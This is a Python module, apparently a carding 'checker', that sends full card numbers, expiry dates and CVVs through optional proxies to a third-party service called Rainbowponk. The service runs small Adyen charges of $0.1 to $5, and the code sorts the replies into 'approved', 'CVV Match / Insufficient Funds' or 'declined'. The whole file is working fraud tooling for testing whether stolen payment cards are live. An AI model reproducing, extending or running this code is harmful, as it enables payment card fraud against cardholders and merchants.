"""
Rainbowponk Adyen Gateway
"""
import httpx
from typing import Optional, Dict, Any

LICENSE_KEY = "@MissNullMe"
BASE_URL = "https://rainbowponk.com"
ADYEN_APIS = {"0.1": "api/api_adyen_1.php", "1": "api/api_adyen_2.php", "2": "api/api_adyen_3.php", "5": "api/api_adyen_4.php"}

async def rainbowponk_adyen_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None, amount: str = "0.1") -> Dict[str, Any]:
    card_data = f"{card}|{month}|{year}|{cvv}"
    api_file = ADYEN_APIS.get(amount, ADYEN_APIS["0.1"])
    url = f"{BASE_URL}/api/check"
    headers = {"Content-Type": "application/json", "Cookie": f"license_key={LICENSE_KEY}", "User-Agent": "Mozilla/5.0"}
    payload = {"lista": card_data, "gateway": api_file}
    try:
        async with httpx.AsyncClient(proxy=proxy, timeout=30.0, follow_redirects=True) as client:
            response = await client.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                result = response.json()
                msg = str(result.get("message", "")).lower()
                if result.get("status") == "success" or "approved" in msg or "authorized" in msg:
                    return {"status": "approved", "message": result.get("message", f"Charged ${amount}"), "card": card_data, "amount": f"${amount}", "gate": f"Rainbowponk Adyen ${amount}"}
                elif "insufficient" in msg or "cvv" in msg:
                    return {"status": "approved", "message": "CVV Match / Insufficient Funds", "card": card_data, "gate": f"Rainbowponk Adyen ${amount}"}
                elif "declined" in msg or "refused" in msg:
                    return {"status": "declined", "message": result.get("message", "Card Declined"), "card": card_data, "gate": f"Rainbowponk Adyen ${amount}"}
                else:
                    return {"status": "error", "message": result.get("message", "Unknown response"), "card": card_data, "gate": f"Rainbowponk Adyen ${amount}"}
            else:
                return {"status": "error", "message": f"HTTP {response.status_code}", "card": card_data, "gate": f"Adyen ${amount}"}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:100]}", "card": card_data, "gate": f"Adyen ${amount}"}

async def adyen_01_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_adyen_check(card, month, year, cvv, proxy, "0.1")
async def adyen_1_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_adyen_check(card, month, year, cvv, proxy, "1")
async def adyen_2_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_adyen_check(card, month, year, cvv, proxy, "2")
async def adyen_5_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_adyen_check(card, month, year, cvv, proxy, "5")
